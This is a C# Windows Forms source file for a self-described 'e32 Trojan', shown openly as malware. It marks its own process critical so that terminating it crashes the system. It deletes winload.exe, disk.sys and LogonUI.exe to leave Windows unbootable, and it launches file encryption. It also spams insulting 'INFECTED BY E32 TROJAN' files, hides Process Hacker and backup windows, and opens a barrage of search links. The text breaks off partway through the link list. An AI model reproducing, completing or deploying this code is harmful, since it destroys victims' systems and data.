using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Media;


namespace e32TrojanHorse
{
    public partial class InitPayloads : Form
    {

        #region DLLImports

        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject([In] IntPtr hObject);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);
        [DllImport("user32.dll")]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);
        [Flags()]
        private enum RedrawWindowFlags : uint
        {
            /// <summary>
            /// Invalidates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_INVALIDATE invalidates the entire window.
            /// </summary>
            Invalidate = 0x1,

            /// <summary>Causes the OS to post a WM_PAINT message to the window regardless of whether a portion of the window is invalid.</summary>
            InternalPaint = 0x2,

            /// <summary>
            /// Causes the window to receive a WM_ERASEBKGND message when the window is repainted.
            /// Specify this value in combination with the RDW_INVALIDATE value; otherwise, RDW_ERASE has no effect.
            /// </summary>
            Erase = 0x4,

            /// <summary>
            /// Validates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_VALIDATE validates the entire window.
            /// This value does not affect internal WM_PAINT messages.
            /// </summary>
            Validate = 0x8,

            NoInternalPaint = 0x10,

            /// <summary>Suppresses any pending WM_ERASEBKGND messages.</summary>
            NoErase = 0x20,

            /// <summary>Excludes child windows, if any, from the repainting operation.</summary>
            NoChildren = 0x40,

            /// <summary>Includes child windows, if any, in the repainting operation.</summary>
            AllChildren = 0x80,

            /// <summary>Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND and WM_PAINT messages before the RedrawWindow returns, if necessary.</summary>
            UpdateNow = 0x100,

            /// <summary>
            /// Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND messages before RedrawWindow returns, if necessary.
            /// The affected windows receive WM_PAINT messages at the ordinary time.
            /// </summary>
            EraseNow = 0x200,

            Frame = 0x400,

            NoFrame = 0x800
        }

        #endregion

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public InitPayloads()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }

        Random r;

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        private void InitPayloads_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            LoadSounds();

            SetTimerIntervals();
            StartCreateFoldersAndFiles.Start();
            StartBlockCmdRegisterAndOthers.Start();
            StartEncryptFiles.Start();
            StartOpenLinksAndApps.Start();
            StartSoundsPlayload.Start();

            DeleteSystemFiles();
            DeleteSystemFiles2();

            NextPayloads.Start();
        }

        private void SetTimerIntervals()
        {
            StartOpenLinksAndApps.Interval = r.Next(10000);
            StartCreateFoldersAndFiles.Interval = 1;
            StartEncryptFiles.Interval = 1;
        }

        private void DeleteSystemFiles()
        {
            try
            {
                string winload_exe = @"C:\Windows\System32\winload.exe";
                string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
                if (File.Exists(winload_exe))
                {
                    File.Delete(winload_exe);
                }
                if (File.Exists(disk_sys))
                {
                    File.Delete(disk_sys);
                }
            }
            catch
            {
                return;
            }
        }

        private void StartCreateFoldersAndFiles_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            Random r4 = new Random();
            string[] arrayhere = new string[]
            {
               "MOMMA",
               "HMMMMMM...",
               "LOVE UR MOMMA OK?",
               "I'm encrypting ur files xdxdxdxd",
               "JOHN CENAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               "PUTIN.EXE LMAO",
               "e32 loves u",
               "I LOVE UR DATA",
               "I LOVE THE INTERNET LMAO",
               "e32 loves ur pc",
               "UR MOMMA SAYS PUTIN HAS A SMALL DICK",
               "THE WINDOWS HATE COCKS",
               ":)",
               ":(",
               ">:)",
               "Your machine is nice LMAOLMAO",
               "JOEL DOESN'T LIKE FOODS WITH BALLS",
               "WINDOWS DEFENDER DOESN'T LIKE ME :(, IT DETECTS ME",
               "DO U WANNA CRY?",
               "I WANT UR MOM OK??",
               "HUMMMMMM, DO U HATE UR DAD??????????????????????",
               "HELLO IT'S ME, MARIO",
               "HUMMMMMMM WHY DON'T U TRY TO FINISH MY TASK?",
               "DICK HEAD LMAO",
               "PUSSY",
               "MINECRAFT POCKET EDITION NO VIRUS",
               "HMMMMM LMAO",
               "NORTON ANTIVIRUS",
               "BAIDU",
               "E32"
            };
            int textrandomtolabelk = r.Next(arrayhere.Length);
            string dictoryAndFileName = arrayhere[textrandomtolabelk] + "_e32_" + r4.Next(9999999) + r.Next(9999999);

            StreamWriter writer = new StreamWriter(dictoryAndFileName + ".e32");
            writer.WriteLine("INFECTED BY E32 TROJAN");
            writer.WriteLine("THIS TROJAN ENCRYPTS UR FILES AND DESTROY THE SYSTEM CONFIG.");
            writer.Close();

            StreamWriter writer2 = new StreamWriter(dictoryAndFileName + ".e32");
            writer2.WriteLine("fuck you");
            writer2.WriteLine("lox");
            writer2.Close();
        }

        private void StartEncryptFiles_Tick(object sender, EventArgs e)
        {
            Encryptor.StartFilesEncryption();
            Encryptor.StartFilesEncryption2();
        }

        private void DeleteSystemFiles2()
        {
            try
            {
                string LogonUI = @"C:\Windows\System32\LogonUI.exe";
                if (File.Exists(LogonUI))
                {
                    File.Delete(LogonUI);
                }
            }
            catch
            {
                return;
            }
        }

        private void StartBlockCmdRegisterAndOthers_Tick(object sender, EventArgs e)
        {
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
        }

        private void NextPayloads_Tick(object sender, EventArgs e)
        {
            var nextForm = new GDIPayloads();
            nextForm.ShowDialog();
        }

        private void StartOpenLinksAndApps_Tick(object sender, EventArgs e)
        {
            StartOpenLinksAndApps.Interval = r.Next(5000, 20000);
            string[] Links = new string[]
            {
               "https://www.google.co.ck/search?q=How+to+remove+a+virus+from+computer&source=hp&ei=3j50Yv_1JcvR1sQPgfOCuAQ&iflsig=AJiK0e8AAAAAYnRM7jGWZYonK6K9enMOQRcrOQ-JQ3NK&ved=0ahUKEwj_3MGipMn3AhXLqJUCHYG5AEcQ4dUDCAc&uact=5&oq=How+to+remove+a+virus+from+computer&gs_lcp=Cgdnd3Mtd2l6EAMyBAgAEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBM6CwgAEIAEELEDEIMBOggIABCABBCxAzoICAAQsQMQgwE6BQgAEIAEOhEILhCABBCxAxCDARDHARCjAjoLCC4QsQMQgwEQ1AI6DgguEIAEELEDEMcBEKMCOgsILhCABBCxAxCDAToLCC4QgAQQsQMQ1AI6DgguEIAEELEDEIMBENQCOgUILhCABDoICC4QgAQQ1AI6CAguELEDENQCOgQIABADOgUIABCxAzoGCAAQFhAeOggIABAWEAoQHjoICAAQDRAeEBM6CggAEAgQDRAeEBNQsQ9YwZoBYNGdAWgKcAB4AIAB3AGIAZsnkgEHMTMuMjcuMpgBAKABAbABAA&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=norton+antivirus+download&ei=9j50Yr-1JZ6Q4dUPjL6LoA4&oq=Norton+an&gs_lcp=Cgdnd3Mtd2l6EAMYAjIICAAQgAQQsQMyBAgAEEMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDoRCAAQ6gIQtAIQigMQtwMQ5QI6EQguEIAEELEDEIMBEMcBENEDOgsILhCABBCxAxCDAToLCAAQgAQQsQMQgwE6DgguEIAEELEDEMcBENEDOhEILhCABBCxAxCDARDHARCjAjoICC4QsQMQgwE6BQgAELEDOgoILhCxAxCDARBDOgQILhBDOgsILhCABBCxAxDUAjoHCAAQsQMQQzoHCC4Q1AIQQzoOCC4QsQMQgwEQxwEQrwE6DgguEIAEELEDEIMBENQCOgsILhCABBDHARCvAUoECEEYAEoECEYYAFDCC1i2FWDeJGgBcAF4AIABngGIAbMIkgEDMS44mAEAoAEBsAEEwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=kaspersky+total+security+download+cracked&ei=ET90YrKqA6vp1sQPmL-UyAg&oq=Kaspersky+download+cracked&gs_lcp=Cgdnd3Mtd2l6EAEYADIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB46EwguEMcBENEDENQCEOoCELQCEEM6EAguEMcBENEDEOoCELQCEEM6CggAEOoCELQCEEM6FAgAEOoCELQCEIoDELcDENQDEOUCOg0ILhDHARDRAxDUAhBDOgQIABBDOg4ILhCABBCxAxDHARDRAzoICAAQgAQQsQM6DgguEIAEELEDEMcBEKMCOggIABCxAxCDAToFCAAQgAQ6BAguEAM6EAguELEDEMcBENEDENQCEEM6BwgAELEDEEM6EQguEIAEELEDEMcBENEDENQCOgcIABCABBAKOggIABAWEAoQHjoFCCEQoAFKBAhBGABKBAhGGABQ1xZYlHpg2JUBaANwAXgAgAGRAYgB0ReSAQQ2LjIymAEAoAEBsAEKwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=Facebook+hack+download+no+virus&ei=Oj90YqTPJYf21sQPmOG0oAg&ved=0ahUKEwik1LDOpMn3AhUHu5UCHZgwDYQQ4dUDCA4&uact=5&oq=Facebook+hack+download+no+virus&gs_lcp=Cgdnd3Mtd2l6EAMyBQghEKABMgUIIRCgATIICCEQFhAdEB46EAguEMcBENEDEOoCELQCEEM6FAgAEOoCELQCEIoDELcDENQDEOUCOhEILhCABBCxAxCDARDHARDRAzoECAAQQzoLCC4QgAQQsQMQgwE6CwguEIAEEMcBEKMCOgoILhDHARDRAxBDOgUIABCABDoLCAAQgAQQsQMQgwE6CAguELEDEIMBOggIABCxAxCDAToQCC4QsQMQgwEQxwEQ0QMQQzoRCC4QgAQQsQMQgwEQxwEQowI6BAguEEM6CggAELEDEIMBEEM6CAgAEIAEELEDOhAILhCxAxCDARDHARDRAxAKOgoIABCxAxCDARAKOgcIABCxAxAKOgUILhCABDoGCAAQFhAeOggIABAWEB4QEzoHCCEQChCgAUoECEEYAEoECEYYAFDkHVjyaWDObWgDcAF4AIABzwGIAbMekgEHMTMuMTkuMZgBAKABAbABCsABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=bonzi+buddy+download&ei=nz90YoWWLvDJ1sQP3s6HwAc&oq=Bonzi&gs_lcp=Cgdnd3Mtd2l6EAMYADIKCAAQsQMQgwEQQzIICAAQgAQQsQMyCAgAEIAEELEDMgUIABCABDIECAAQQzIFCAAQgAQyBAgAEEMyCwgAEIAEELEDEIMBMgUIABCABDIFCC4QgAQ6CAguELEDEIMBOhEILhCABBCxAxCDARDHARCjAjoKCC4QxwEQowIQQzoHCAAQsQMQQzoRCC4QgAQQsQMQgwEQxwEQrwE6CwguEIAEELEDEIMBOggIABCxAxCDAToICC4QgAQQsQM6CwguEIAEELEDENQCOgoIABCxAxCxAxAKSgQIQRgASgQIRhgAUABY8A9glRpoAXABeACAAX2IAa8FkgEDMC42mAEAoAEBwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=sad+john+cena&ei=pT90Yv38NovK1sQP38ma-Ak&ved=0ahUKEwi948SBpcn3AhULpZUCHd-kBp8Q4dUDCA4&uact=5&oq=sad+john+cena&gs_lcp=Cgdnd3Mtd2l6EAMyCAgAEBYQHhATMggIABAWEB4QEzoKCAAQ6gIQtAIQQzoNCC4Q1AIQ6gIQtAIQQzoUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6BAgAEEM6CgguEMcBENEDEEM6EQguEIAEELEDEIMBEMcBENEDOgsILhCABBCxAxCDAToOCC4QgAQQsQMQgwEQ1AI6CAguELEDEIMBOgUIABCABDoRCC4QgAQQsQMQgwEQxwEQowI6CwgAEIAEELEDEIMBOggIABCxAxCDAToICAAQgAQQsQM6BAguEEM6CAguEIAEELEDOgsILhCABBCxAxDUAjoHCC4Q1AIQQzoFCAAQsQM6CwguEIAEEMcBEK8BOgcIABCABBAKOgYIABAWEB46BAgAEBM6BAguEBM6BggAEAoQEzoKCAAQCBANEB4QE0oECEEYAEoECEYYAFCHCFjwKGDDLGgCcAF4AIABiQGIAaQNkgEEMC4xNJgBAKABAbABCsABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=how+to+code+a+virus+in+html&ei=wz90YvmYB_f51sQP7bWs-A0&oq=how+to+code+a+virus+in+&gs_lcp=Cgdnd3Mtd2l6EAMYBjIECAAQEzIECAAQEzIECAAQEzIECAAQEzIECAAQEzIECAAQEzIECAAQEzIICAAQFhAeEBMyCAgAEBYQHhATOgsIABCABBCxAxCDAToICAAQgAQQsQM6CAgAELEDEIMBOgUIABCABDoRCC4QgAQQsQMQgwEQxwEQowI6CwguELEDEIMBENQCOg4ILhCABBCxAxDHARCjAjoECC4QQzoECAAQQzoLCC4QgAQQsQMQ1AI6DgguEIAEELEDEIMBENQCOgUILhCABDoICC4QgAQQ1AI6BAgAEAM6BQgAELEDOgYIABAWEB46CAgAEBYQChAeSgQIQRgASgQIRhgAUNMHWLGBAWCcogFoA3AAeAGAAYoCiAGNIpIBBjQuMzAuMZgBAKABAbABAMABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=hentai+videos+download&ei=NkB0YoanB-eE1sQPwpyMuAg&ved=0ahUKEwiGmqfGpcn3AhVngpUCHUIOA4cQ4dUDCA4&uact=5&oq=hentai+videos+download&gs_lcp=Cgdnd3Mtd2l6EAM6CgguEOoCELQCEEM6FAgAEOoCELQCEIoDELcDENQDEOUCOggIABCABBCxAzoLCAAQgAQQsQMQgwE6BQgAEIAEOggIABCxAxCDAToRCC4QgAQQsQMQgwEQxwEQowI6CwguELEDEIMBENQCOggILhCABBCxAzoOCC4QgAQQsQMQxwEQ0QM6CwguEIAEELEDEIMBOgQIABBDSgQIQRgASgQIRhgAUJ5gWIiXAWDBmgFoAnABeACAAXqIAeMRkgEEMTQuOZgBAKABAbABCsABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=minecraft+free+download+2022&ei=TUB0Yq-JH77_1sQP3fSX2AU&oq=minecraft+free+do&gs_lcp=Cgdnd3Mtd2l6EAMYATIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQ6CwgAEIAEELEDEIMBOhEILhCABBCxAxCDARDHARDRAzoLCC4QsQMQgwEQ1AI6EQguEIAEELEDEIMBEMcBEKMCOggIABCxAxCDAToOCC4QgAQQsQMQxwEQ0QM6CggAELEDEIMBEEM6BAgAEEM6BwguENQCEEM6CwguEIAEELEDEIMBOgoILhCxAxCDARBDOgsILhCABBCxAxDUAjoICC4QsQMQgwE6CAgAEIAEELEDOggILhCABBDUAjoECC4QQzoICC4QgAQQsQM6BwgAELEDEEM6CwguEIAEEMcBEK8BOg4ILhCABBCxAxDHARCjAjoRCC4QgAQQsQMQgwEQxwEQrwE6BwgAEIAEEAo6CgguELEDENQCEAo6DQguELEDEIMBENQCEAo6BAguEAo6BwgAELEDEAo6BAguEA06BAgAEA06BwguENQCEA06BAgAEBM6BggAEAoQEzoUCC4QgAQQsQMQgwEQxwEQ0QMQ1AI6DgguEIAEELEDEIMBENQCOgUILhCABDoHCC4QsQMQQ0oECEEYAEoECEYYAFDgDljigwJgqZQCaBNwAHgAgAGTAYgB3x-SAQQ0LjMxmAEAoAEBsAEAwAEB&sclient=gws-wiz",
               "https://www.softonic.com.br/",
               "https://www.google.co.ck/search?q=mcafee+removal+tool&ei=xUB0YtOoL-KJ4dUPxM-iwAo&oq=mcafee+&gs_lcp=Cgdnd3Mtd2l6EAEYCTIICAAQgAQQsQMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDILCAAQgAQQsQMQgwEyBQgAEIAEMgUIABCABDIFCAAQgAQ6BwgAEEcQsAM6BwgAELADEEM6CggAEOQCELADGAE6FQguEMcBENEDENQCEMgDELADEEMYAjoSCC4QxwEQ0QMQyAMQsAMQQxgCSgQIQRgASgQIRhgBULgMWLgMYKQdaAFwAXgAgAGHAYgBhwGSAQMwLjGYAQCgAQHIARPAAQHaAQYIARABGAnaAQYIAhABGAg&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=agostinho+carrara&ei=y0B0YqKqHZ3f1sQP_86s0AY&oq=Agostinh&gs_lcp=Cgdnd3Mtd2l6EAMYADIICAAQgAQQsQMyCwguEIAEELEDEIMBMgsILhCABBCxAxCDATILCAAQgAQQsQMQgwEyCwgAEIAEELEDEIMBMgUILhCABDIFCAAQgAQyBQgAEIAEMgsILhCABBDHARCvATIFCAAQgAQ6BwgAEEcQsAM6BwgAELADEEM6CggAEOQCELADGAE6EgguEMcBENEDEMgDELADEEMYAjoPCC4Q1AIQyAMQsAMQQxgCOgoIABDqAhC0AhBDOhQIABDqAhC0AhCKAxC3AxDUAxDlAjoRCC4QgAQQsQMQgwEQxwEQ0QM6CwguEIAEEMcBENEDOgQIABBDOggILhCABBCxAzoHCAAQsQMQQzoNCAAQgAQQsQMQgwEQCjoHCAAQgAQQCjoLCC4QgAQQsQMQ1AI6CgguEMcBENEDEEM6CAguELEDEIMBOhEILhCABBCxAxCDARDHARCjAjoKCAAQsQMQgwEQQzoOCC4QsQMQgwEQxwEQ0QM6CgguEMcBEKMCEEM6BQgAELEDOg4ILhCABBCxAxDHARCjAjoOCC4QgAQQsQMQgwEQ1AI6EQguEIAEELEDEIMBEMcBEK8BOgsILhCABBDHARCjAjoICAAQsQMQgwE6BAgAEAM6DgguEIAEELEDEMcBENEDOgoILhCxAxCDARBDSgQIQRgASgQIRhgBUICHAVihmwNg-KIDaBdwAXgBgAGOAogBnB2SAQY1LjIzLjGYAQCgAQGwAQrIARPAAQHaAQYIARABGAnaAQYIAhABGAg&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=is+memz+trojan+safe&ei=AkF0YsTeOeLn1sQPotqhsA0&oq=is+memz+trojan+&gs_lcp=Cgdnd3Mtd2l6EAMYADIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjoKCAAQ6gIQtAIQQzoNCC4Q1AIQ6gIQtAIQQzoKCC4Q6gIQtAIQQzoUCC4QgAQQsQMQgwEQxwEQ0QMQ1AI6CwgAEIAEELEDEIMBOhEILhCABBCxAxCDARDHARCjAjoICAAQsQMQgwE6BAguEEM6DgguEIAEELEDEIMBENQCOgUILhCABDoECAAQQzoHCAAQsQMQQzoICAAQgAQQsQM6EQguEIAEELEDEIMBEMcBEK8BOgsILhCABBCxAxCDAToFCAAQgAQ6BwguEIAEEAo6EQguEIAEELEDEIMBEMcBENEDOgsILhCxAxCDARDUAjoOCC4QgAQQsQMQxwEQ0QM6CAguEIAEELEDOgsILhCABBCxAxDUAjoICC4QgAQQ1AI6CwguEIAEEMcBEK8BOgoILhCxAxCDARAKOgQIABATOggIABAWEB4QEzoGCAAQChATOgoIABAIEA0QHhATOgcIIRAKEKABOgQIIRAVOgUIIRCgAToICCEQFhAdEB5KBAhBGABKBAhGGABQ3wVYvV9gu2hoEHABeACAAaABiAGkG5IBBDMuMjeYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=ransomware+remover+free&ei=KkF0YrOIDcPz1sQPvM-M-AU&oq=ransomware+remover&gs_lcp=Cgdnd3Mtd2l6EAMYATIFCAAQgAQyBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMggIABAWEAoQHjoUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6EQgAEOoCELQCEIoDELcDEOUCOgsIABCABBCxAxCDAToLCC4QgAQQsQMQgwE6CAgAELEDEIMBOhEILhCABBCxAxCDARDHARCjAjoICAAQgAQQsQM6BAgAEEM6CAguELEDEIMBOgsILhCABBDHARCvAToKCAAQsQMQgwEQQzoHCC4Q1AIQQzoECAAQAzoICC4QgAQQsQM6EQguEIAEELEDEIMBEMcBENEDOgcILhCxAxBDOgcIABCxAxAKOgcIABCxAxBDOgsILhCABBCxAxDUAjoGCAAQChADSgQIQRgASgQIRhgAUJGKAVidyAFgjdgBaAVwAXgAgAGWAYgBsBKSAQQ0LjE3mAEAoAEBsAEHwAEB&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=e32+trojan+download&ei=cUF0YoyEDZ3V1sQP-saryAE&oq=e32+trojan+down&gs_lcp=Cgdnd3Mtd2l6EAMYADIFCCEQoAEyBQghEKABOhAILhDHARDRAxDqAhC0AhBDOhEIABDqAhC0AhCKAxC3AxDlAjoXCC4QxwEQ0QMQ6gIQtAIQigMQtwMQ5QI6CAgAEIAEELEDOgsIABCABBCxAxCDAToRCC4QgAQQsQMQgwEQxwEQowI6BQgAEIAEOgUILhCABDoOCC4QgAQQsQMQgwEQ1AI6CAgAELEDEIMBOgQIABATOggIABAWEB4QEzoGCAAQFhAeOgcIIRAKEKABSgQIQRgASgQIRhgAUABY7UNg3kloAXABeACAAZIBiAHpDZIBBDAuMTWYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=how+to+disable+windows+defender&ei=hUF0Yqq_B7yJ1sQPvJug8AY&oq=how+to+disable+w&gs_lcp=Cgdnd3Mtd2l6EAMYADIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQ6FAgAEOoCELQCEIoDELcDENQDEOUCOgsIABCABBCxAxCDAToICAAQgAQQsQM6CAgAELEDEIMBOhEILhCABBCxAxCDARDHARCjAjoLCC4QsQMQgwEQ1AI6DgguEIAEELEDEMcBEKMCOgQIABBDOgsILhCABBCxAxCDAToOCC4QgAQQsQMQgwEQ1AI6BQguEIAEOggILhCABBDUAjoLCC4QgAQQsQMQ1AI6BAgAEAM6BQgAELEDSgQIQRgASgQIRhgAUM8GWLUhYL4paAFwAXgAgAF8iAHzDJIBBDYuMTCYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=baidu+pc+faster&ei=m0F0YuHcGdzQ1sQPucuA0AI&oq=baidu+&gs_lcp=Cgdnd3Mtd2l6EAMYATIKCAAQsQMQgwEQQzIFCAAQgAQyBAgAEEMyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEOgoIABDqAhC0AhBDOhQIABDqAhC0AhCKAxC3AxDUAxDlAjoICC4QsQMQgwE6CwgAEIAEELEDEIMBOggIABCABBCxAzoFCC4QgAQ6EQguEIAEELEDEIMBEMcBEKMCOgcIABCxAxBDOggILhCABBCxAzoICC4QgAQQ1AI6CgguEMcBENEDEEM6DgguEIAEELEDEMcBENEDSgQIQRgASgQIRhgAUMkFWOwOYMYiaAFwAXgAgAG0AYgBgAaSAQMwLjaYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=valorant+source+code&ei=rEF0YqeFMNbv1sQPu8GigA0&oq=valorant+source+&gs_lcp=Cgdnd3Mtd2l6EAMYADIECAAQEzIECAAQEzIECAAQEzIECAAQEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzoKCAAQ6gIQtAIQQzoUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6CAgAEIAEELEDOhEILhCABBCxAxCDARDHARCjAjoECAAQAzoLCC4QgAQQsQMQgwE6BQguEIAEOgsIABCABBCxAxCDAToECAAQQzoOCC4QgAQQsQMQxwEQ0QM6BwguELEDEEM6BAguEEM6CAguEIAEELEDOgcIABCxAxBDOgUIABCABDoGCAAQFhAeSgQIQRgASgQIRhgAUJukAVjLzQFgo9kBaAFwAXgAgAHUAYgByw6SAQY0LjExLjGYAQCgAQGwAQrAAQE&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=xvidio+technologies+startup&ei=3kF0YumBAeL11sQPuoSY-As&oq=xvid&gs_lcp=Cgdnd3Mtd2l6EAMYADIECAAQAzIFCAAQgAQyBQgAEIAEMggIABCxAxCDAToUCAAQ6gIQtAIQigMQtwMQ1AMQ5QI6EQgAEOoCELQCEIoDELcDEOUCOggIABCABBCxAzoRCC4QgAQQsQMQgwEQxwEQ0QM6CwgAEIAEELEDEIMBOgQILhADOggILhCxAxCDAToICC4QgAQQsQM6BQguELEDSgQIQRgASgQIRhgAUJIqWM06YI9JaAJwAXgAgAF2iAGjBJIBAzAuNZgBAKABAbABCsABAQ&sclient=gws-wiz",
               "https://www.google.co.ck/search?q=9mm+gun+price+in+china&ei=EUJ0YsDbOo751sQP-v65sAo&oq=9mm+gun+price&gs_lcp=Cgdnd3Mtd2l6EAMYAjIECAAQEzIECAAQEzIICAAQFhAeEBM6CAgAELEDEIMBOggILhCABBDUAjoLCC4QgAQQxwEQ0QM6BQguEIAEOggILhCABBCxAzoLCC4QgAQQsQMQgwE6CAgAEIAEELEDOgUIABCABDoOCC4QgAQQxwEQrwEQ1AI6BAgAEEM6CggAELEDEIMBEEM6BwgAELEDEEM6CwgAEIAEELEDEIMBOgYIABAWEB46CAgAEBYQChAeOgQIABANOgYIABANEB46CggAEAgQDRAeEBNKBAhBGABKBAhGGABQpyhYhnlg8YUBaANwAHgAgAGBAYgBgw2SAQQxLjE0mAEAoAEBsAEAwAEB&sclient=gws-wiz",
